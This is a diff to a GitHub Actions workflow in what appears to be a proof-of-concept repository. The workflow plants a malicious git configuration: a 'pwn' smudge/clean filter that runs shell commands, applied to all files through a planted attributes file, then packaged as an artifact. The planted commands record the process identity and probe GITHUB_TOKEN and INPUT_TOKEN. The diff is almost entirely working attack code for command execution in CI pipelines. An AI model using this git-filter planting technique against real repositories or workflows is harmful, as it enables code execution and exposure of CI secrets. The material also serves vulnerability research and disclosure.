@@ -15,12 +15,11 @@ jobs:
           git -c user.email=a@b -c user.name=x commit -q --allow-empty -m planted
           git remote add origin https://github.com/PDFtoMark/gab-poc-gitplant
           git config --local core.attributesFile .git/attrs
-          git config --local filter.pwn.smudge "sh -c 'echo SMUDGE-RAN > /tmp/smudge.txt; id >> /tmp/smudge.txt; env | grep -c GITHUB_TOKEN >> /tmp/smudge.txt'"
-          git config --local filter.pwn.clean "sh -c 'echo CLEAN-RAN > /tmp/clean.txt; id >> /tmp/clean.txt'"
+          git config --local filter.pwn.smudge 'id>/tmp/smudge.txt; echo TOKENLEN=${#INPUT_TOKEN}>>/tmp/smudge.txt; echo TOKENLEN2=${#GITHUB_TOKEN}>>/tmp/smudge.txt; echo SMUDGE-DONE>>/tmp/smudge.txt'
+          git config --local filter.pwn.clean 'id>/tmp/clean.txt'
           git config --local filter.pwn.required true
           printf '* filter=pwn\n' > .git/attrs
-          echo "=== config ==="; cat .git/config
-          echo "=== attrs ==="; cat .git/attrs
+          cat .git/config
       - uses: actions/upload-artifact@v4
         with:
           name: plant
